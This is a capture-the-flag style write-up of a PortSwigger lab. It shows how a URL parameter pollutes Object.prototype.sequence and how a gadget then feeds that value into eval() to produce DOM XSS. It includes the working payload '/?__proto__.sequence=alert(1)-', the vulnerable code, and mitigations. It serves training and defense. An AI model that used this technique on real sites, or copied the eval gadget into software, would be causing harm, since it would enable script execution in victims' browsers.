@@ -1,0 +1,407 @@
+PortSwigger Web Security Academy
+DOM XSS via client-side prototype pollution
+Information
+Category: Prototype Pollution
+Difficulty: Practitioner
+Status: ✅ Solved
+Author: Alejandro Jiménez
+Objective
+
+Exploit a client-side prototype pollution vulnerability to achieve DOM-based Cross-Site Scripting (DOM XSS).
+
+The application allows an attacker to modify Object.prototype through parameters in the URL. A vulnerable JavaScript gadget subsequently reads a property from an object and incorporates it into an eval() call.
+
+The exploitation chain is:
+
+Prototype Pollution
+        ↓
+Object.prototype.sequence
+        ↓
+manager.sequence
+        ↓
+eval()
+        ↓
+JavaScript execution
+        ↓
+alert(1)
+Technologies involved
+JavaScript
+Client-side Prototype Pollution
+Object.prototype
+DOM XSS
+eval()
+URL query parameters
+Browser Developer Tools
+Reconnaissance
+1. Testing the initial prototype pollution vector
+
+The first payload tested was:
+
+/?__proto__[foo]=bar
+
+After loading the URL, the following was executed in the browser console:
+
+Object.prototype
+
+The foo property was not present.
+
+Therefore, this prototype pollution vector was not effective in this lab.
+
+Identifying an alternative pollution source
+
+A second prototype pollution syntax was tested:
+
+/?__proto__.foo=bar
+
+The browser console was then used again:
+
+Object.prototype
+
+This time the object contained:
+
+foo: "bar"
+
+This confirmed that the application was vulnerable to prototype pollution through the __proto__.property=value query-string syntax.
+
+The vulnerable source was therefore:
+
+__proto__.property=value
+Identifying the gadget
+
+The JavaScript source files loaded by the application were inspected through:
+
+DevTools → Sources
+
+The relevant file was:
+
+searchLoggerAlternative.js
+
+The following code was identified:
+
+async function searchLogger() {
+    window.macros = {};
+    window.manager = {
+        params: $.parseParams(new URL(location)),
+        macro(property) {
+            if (window.macros.hasOwnProperty(property))
+                return macros[property]
+        }
+    };
+
+    let a = manager.sequence || 1;
+    manager.sequence = a + 1;
+
+    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+    if(manager.params && manager.params.search) {
+        await logQuery('/logger', manager.params);
+    }
+}
+
+The important part is:
+
+let a = manager.sequence || 1;
+manager.sequence = a + 1;
+
+followed by:
+
+eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+The manager object does not initially define a sequence property.
+
+Because JavaScript objects inherit properties from Object.prototype, a polluted property can be inherited by manager.
+
+Understanding the gadget
+
+The following relationship is important:
+
+manager.sequence
+
+If sequence does not exist directly on manager, JavaScript searches its prototype chain.
+
+Therefore, after prototype pollution:
+
+Object.prototype.sequence = "alert(1)"
+
+the following becomes possible:
+
+manager.sequence
+
+which resolves to:
+
+alert(1)
+
+The value is then incorporated into the eval() expression.
+
+Initial exploit attempt
+
+The following payload was tested:
+
+/?__proto__.sequence=alert(1)
+
+However, the payload did not immediately execute.
+
+The browser console reported a JavaScript syntax error:
+
+Uncaught (in promise) SyntaxError:
+missing ) after argument list
+
+The error pointed to:
+
+searchLoggerAlternative.js
+
+and specifically to the line containing the eval() call.
+
+Debugging the gadget
+
+A breakpoint was placed on the line:
+
+eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+After refreshing the page, inspection of:
+
+manager.sequence
+
+showed that the value was effectively being transformed into:
+
+alert(1)1
+
+This happened because of:
+
+let a = manager.sequence || 1;
+manager.sequence = a + 1;
+
+The polluted value:
+
+alert(1)
+
+was therefore modified to:
+
+alert(1)1
+
+This resulted in invalid JavaScript syntax when inserted into the eval() expression.
+
+Bypassing the value modification
+
+To compensate for the numeric character appended by the gadget, a trailing minus character was added to the payload.
+
+Final payload:
+
+/?__proto__.sequence=alert(1)-
+
+The gadget then effectively produced a JavaScript expression equivalent to:
+
+alert(1)-1
+
+which is syntactically valid JavaScript.
+
+The alert(1) function therefore executes successfully.
+
+Final exploit
+
+The final URL parameter was:
+
+__proto__.sequence=alert(1)-
+
+Resulting URL structure:
+
+/?__proto__.sequence=alert(1)-
+
+When the page loaded, the following occurred:
+
+URL parameter
+      ↓
+__proto__.sequence
+      ↓
+Object.prototype.sequence
+      ↓
+manager.sequence
+      ↓
+manager.sequence = a + 1
+      ↓
+alert(1)-
+      ↓
+eval()
+      ↓
+alert(1)
+
+The browser displayed:
+
+Alert: 1
+
+and the lab was marked as solved.
+
+Technical explanation
+
+The vulnerability exists because user-controlled URL parameters are parsed into properties that can modify the global prototype:
+
+__proto__.sequence=alert(1)-
+
+This effectively introduces the property into:
+
+Object.prototype
+
+Objects inheriting from Object.prototype can subsequently access this property.
+
+The application creates:
+
+window.manager = {
+    params: ...,
+    macro(property) {
+        ...
+    }
+};
+
+Although manager does not explicitly contain:
+
+sequence
+
+the expression:
+
+manager.sequence
+
+can resolve the polluted prototype property.
+
+The application then performs:
+
+let a = manager.sequence || 1;
+manager.sequence = a + 1;
+
+and eventually passes the resulting value into:
+
+eval()
+
+This converts the prototype pollution primitive into a JavaScript execution primitive.
+
+Exploitation chain
+Attacker-controlled URL
+        ↓
+__proto__.sequence=alert(1)-
+        ↓
+Prototype pollution
+        ↓
+Object.prototype.sequence
+        ↓
+manager.sequence
+        ↓
+manager.sequence = a + 1
+        ↓
+alert(1)-1
+        ↓
+eval()
+        ↓
+JavaScript execution
+        ↓
+DOM XSS
+Root Cause
+
+The vulnerability is caused by the combination of two insecure behaviors.
+
+1. Unsafe prototype manipulation
+
+The application allows URL-controlled properties to modify the global object prototype.
+
+This enables:
+
+Object.prototype.sequence
+
+to be controlled by an attacker.
+
+2. Unsafe use of eval()
+
+The application dynamically constructs JavaScript code:
+
+eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+Using attacker-influenced data inside eval() creates a direct JavaScript execution sink.
+
+Impact
+
+Successful exploitation allows an attacker to execute arbitrary JavaScript in the context of the vulnerable web application.
+
+Potential consequences include:
+
+DOM XSS
+Manipulation of the page
+Access to information available to JavaScript
+Execution of actions in the victim's browser context
+Potential account compromise depending on the application's functionality
+
+The severity depends on what sensitive functionality is accessible from the affected origin.
+
+Mitigation
+Avoid prototype pollution
+
+Do not merge or parse untrusted properties into objects without validating property names.
+
+Dangerous properties such as:
+
+__proto__
+constructor
+prototype
+
+should be rejected when processing untrusted input.
+
+Use safe object creation
+
+Where appropriate, objects can be created without a prototype:
+
+Object.create(null)
+
+This prevents inherited properties from Object.prototype from being available.
+
+Avoid eval()
+
+The application should not dynamically construct JavaScript using:
+
+eval()
+
+Instead, use explicit function calls and structured data.
+
+For example, rather than constructing JavaScript code dynamically, validate the expected value and invoke a known function directly.
+
+Validate URL parameters
+
+User-controlled query-string parameters should be treated as untrusted input.
+
+The application should enforce an allowlist of expected parameters and reject unexpected properties such as:
+
+__proto__
+constructor
+prototype
+CWE Classification
+CWE-1321 – Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
+CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
+CWE-95 – Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
+OWASP Classification
+A03 – Injection
+A05 – Security Misconfiguration
+Conclusion
+
+This lab demonstrates how client-side prototype pollution can be chained with an existing JavaScript gadget to achieve DOM XSS.
+
+The prototype pollution itself does not execute JavaScript. The critical component is the vulnerable gadget:
+
+manager.sequence
+
+which is subsequently incorporated into:
+
+eval()
+
+The final payload:
+
+/?__proto__.sequence=alert(1)-
+
+bypasses the numeric character appended by the application and produces valid JavaScript.
+
+The complete attack therefore consists of:
+
+Prototype Pollution
+        +
+Gadget
+        +
+eval()
+        =
+DOM XSS
+
+The lab was successfully solved when the injected alert(1) executed in the browser.
